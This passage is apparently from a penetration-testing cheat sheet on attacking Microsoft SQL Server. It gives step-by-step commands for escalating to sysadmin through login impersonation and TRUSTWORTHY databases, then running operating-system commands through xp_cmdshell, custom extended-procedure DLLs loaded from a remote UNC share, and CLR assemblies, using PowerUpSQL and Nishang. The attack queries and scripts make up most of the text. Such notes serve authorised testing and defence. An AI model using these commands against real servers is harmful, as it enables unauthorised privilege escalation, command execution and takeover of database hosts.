```
SELECT * FROM sys.user_token
```

- Check active login token

```
SELECT * FROM sys.login_token
```

### Privilege Escalation

- List of ways to escalate privileges on a SQL Server

```
- Brute force
- Public to sysadmin (misconfigured roles and databases, poorly written stored procedures, excessive permissions)
- sysadmin to OS Service Account (command execution, UNC path)
- OS Service Account to OS Admin
- OS Admin to sysadmin
```

*User Impersonation (EXECUTE AS): When EXECUTE AS is used, the execution context is switched to the specified login or user name. Impersonation allows impersonation of other users and logins to be able to access resources which means it can be abused to use privileges and objects available to other users.*

- Find SQL Server logins which can be impersonated in the current database

```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
PS C:\> Invoke-SQLAuditPrivImpersonateLogin -Username <username> -Password <password> -Instance <MSSQL server> -Verbose        # Using PowerUpSQL
PS C:\> Invoke-SQLAuditPrivImpersonateLogin -Username <username> -Password <password> -Instance <MSSQL server> -Exploit -Verbose        # Note the difficulty in automating the abuse of chained/nested impersonation, it must be done manually
```

- Exploit impersonation manually

```
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'dbadmin'        # Put the user you can impersonate
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
```

- Exploit chained/nested impersonation manually

```
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'dbadmin'        # Put the user you can impersonate
SELECT SYSTEM_USER
EXECUTE AS LOGIN = 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
```

*TRUSTWORTHY Database: A database property (is_trustworthy_on) is used to indicate whether a SQL Server instance trusts a database and its contents. The property is turned off by default as a security measure. Only a sysadmin can set a database to be TRUSTWORTHY. When TRUSTWORTHY is off, impersonated users (by using EXECUTE AS) will only have database-scope permissions but when TRUSTWORTHY is turned on impersonated users can perform actions with server level permissions. This allows writing procedures that can execute code which uses server level permission. If the TRUSTWORTHY setting is set to ON, and if a sysadmin (not necessarily sa) is owner of the database, it is possible for the database owner (a user with db_owner) to elevate privileges to sysadmin. This works even if sa is disabled.*

- Check for TRUSTWORTHY databases - can be done with public role (msdb will always be set to true)

```
SELECT name as database_name, SUSER_NAME(owner_sid) AS database_owner, is_trustworthy_on AS TRUSTWORTHY from sys.databases
PS C:\> Invoke-SQLAudit -Instance <MSSQL server> -Verbose | Out-GridView        # Using PowerUpSQL
PS C:\> Invoke-SQLAuditPrivTrustworthy -Instance <MSSQL server> -Verbose        # Using PowerUpSQL
```

- Check for db_owner - can be done with public role

```
use <TRUSTWORTHY database>
SELECT DP1.name AS DatabaseRoleName, isnull (DP2.name, 'No members') AS DatabaseUserName FROM sys.database_role_members AS DRM RIGHT OUTER JOIN sys.database_principals AS DP1 ON DRM.role_principal_id = DP1.principal_id LEFT OUTER JOIN sys.database_principals AS DP2 ON DRM.member_principal_id = DP2.principal_id WHERE DP1.type = 'R' ORDER BY DP1.name;
```

- Use EXECUTE AS to elevate privileges by adding our user to sysadmin (If TRUSTWORTHY property is turned off we will be unable to execute as it will not have enough permissions)

```
use <TRUSTWORTHY database>
EXECUTE AS USER = 'dbo'
SELECT system_user
SELECT IS_SRVROLEMEMBER('sysadmin')
EXEC sp_addsrvrolemember 'opsdc\labuser','sysadmin'
```

### Command Execution

*Now we have sysadmin privileges on a SQL Server, it is possible to execute OS level commands on the server. What are the privileges with which we can execute commands on a SQL Server? SQL Server service account in almost all cases and agent service account for agent jobs. SQL Server service account can be: Local user, Local Admin, SYSTEM, Network service, Local managed service account, Domain user, Domain Admin, Domain managed service account.*

- List of ways to execute OS commands once we have enough privileges on a SQL Server

```
- xp_cmdshell
- Custom Extended Stored Procedures
- Custom Common Language Runtime (CLR) Assemblies
- OLE Automation Procedure
- Agent Jobs (CmdExec, PowerShell, ActiveX etc...)
- Registry Autoruns
- File Autoruns
- External Scripting
```

*xp_cmdshell is disabled by default since SQL Server 2005, however can be reinstalled or reenabled if we have sysadmin privileges. The command gets executed with the privileges of the SQL Server service account. It is synchronous: control is not returned to the caller until command execution is complete. Keep this in mind when running reverse shells using this method. Also, sysadmin privileges are required to use this stored procedure.*

- Reinstall xp_cmdshell if it is uninstalled

```
sp_addextendedproc 'xp_cmdshell','xplog70.dll'
```

- Reenable xp_cmdshell if it is uninstalled

```
EXEC sp_configure 'show advanced options',1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
```

- Execute a command using xp_cmdshell

```
EXEC master..xp_cmdshell 'whoami'
PS C:\> Execute-Command-MSSQL -ComputerName <MSSQL server> -UserName <username> -Password <password>        # Using Nishang
PS C:\> Invoke-SQLOScmd -Username <username> -Password <password> -Instance <MSSQL server> -Command <command>        # Using PowerUpSQL
```

*Extended Stored Procedure can be loaded from a DLL which acts as an extension to SQL server. The DLL needs to be on the disk. Also, sysadmin privileges are required to register each Extended Stored Procedure inside a DLL. Executes with the privileges of the service account and runs in the process space of SQL Server. The DLL can have any file extension and can also be loaded from UNC path or Webdav.*

- Add an Extended Stored Procedure (sp_addentendedproc can be used to register the stored procedure. Note that the function name in the DLL and the command must be exactly the same (case-sensitive))

```
sp_addextendedproc 'xp_calc', 'C:\mydll\xp_calc.dll'
PS C:\> Create-SQLFileXpDll -OutFile C:\fileserver\xp_calc.dll -Command "calc.exe" -ExportName xp_calc        # Creating the DLL using PowerUpSQL
PS C:\> Get-SQLQuery -UserName <username> -Password <password> -Instance <MSSQL server> -Query "sq_addextendedproc 'xp_calc', '\\<IP address>\fileserver\xp_calc.dll'"        # Adding the DLL using PowerUpSQL
```

- Execute the Extended Stored Procedure

```
EXEC xp_calc
PS C:\> Get-SQLQuery -UserName <username> -Password <password> -Instance <MSSQL server> -Query "EXEC xp_calc"        # Using PowerUpSQL
```

- List existing Extended Stored Procedures

```
PS C:\> Get-SQLStoredProcedureXP -Instance <MSSQL server> -Verbose
```

- Drop the Extended Stored Procedure

```
sp_dropextendedproc 'xp_calc'
```

- Code sample for DLL links

https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/xp_evil_template.cpp
https://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure

*Custom Common Language Runtime (CLR) is a run-time environment provided by the .NET framework. SQL Server supports CLR
integration which allows writing stored procedures and other things by importing a DLL. CLR integration is off by default and sysadmin privileges are required by default to use it. Create assembly, Alter assembly or DDL_Admin role can also use it. The execution takes place with privileges of the service account.*

- Create the DLL cmd_exec.cs link

https://www.netspi.com/blog/technical/adversary-simulation/attacking-sql-server-clr-assemblies/

- Compile the DLL (the DLL can be loaded from a local path or a UNC path)

```
PS C:\> C:\Windows\Microsofr.NET\Framework64\v4.0.30319\csc.exe /target:library C:\Users\labuser\Desktop\cmd_exec.cs
```

- Enable CLR

```
use msdb
GO
-- Enable show advanced options on the server
sp_configure 'show advanced options',1
RECONFIGURE
GO
-- Enable clr on the server
sp_configure 'clr enabled',1
RECONFIGURE
GO
```

- Import the assembly and use the stored procedure

```
-- Import the assembly
CREATE ASSEMBLY my_assembly
FROM '\\<IP address>\fileserver\cmd_exec.dll'
WITH PERMISSION_SET = UNSAFE;
GO
-- Link the assembly to a stored procedure
CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
GO
cmd_exec 'whoami'
```

- Drop the procedure and assembly

```
DROP PROCEDURE cmd_exec
DROP ASSEMBLY my_assesmbly
```

- Create stored procedure without using a DLL file (CREATE ASSEMBLY also accepts hexadecimal string of a CLR DLL)

```
-- Import the assembly from a file
CREATE ASSEMBLY my_assembly
FROM '\\<IP address>\fileserver\cmd_exec.dll'
--Import the assembly from string
CREATE ASSEMBLY [NMfsa] AUTHORIZATION [dbo] FROM 0x4D5A90....
WITH PERMISSION_SET = UNSAFE
```

- Create C# code for the DLL, the DLL, and SQL query with DLL as hexadecimal string

```
PS C:\> Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir C:\Users\labuser\Desktop        # Using PowerUpSQL
```

- Execute a command using the CLR assembly

```
PS C:\> Invoke-SQLOSCmdCLR -Username <username> -Password <password> -Instance <MSSQL server> -Command <"command"> -Verbose        # Using PowerUpSQL
```

- List all the stored procedures added using CLR

```
PS C:\> Get-SQLStoredProcedureCLR -Instance <MSSQL server> -Verbose        # Using PowerUpSQL
```
















### Other Notes 

- Check what account the SQL server is running as

```
SELECT servicename, service_account FROM sys.dm_server_services
```

- Find trustworthy databases (msdb will always be set to true)

```
PS C:\> Invoke-Sqlcmd -Query 'SELECT name as database_name, SUSER_NAME(owner_sid) AS database_owner, is_trustworthy_on AS TRUSTWORTHY from sys.databases' -Username <username> -Password <password>
```

- Check WMI permanent event consumers

```
PS C:\> Get-WmiObject -Namespace root\subscription -List
PS C:\> Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
```
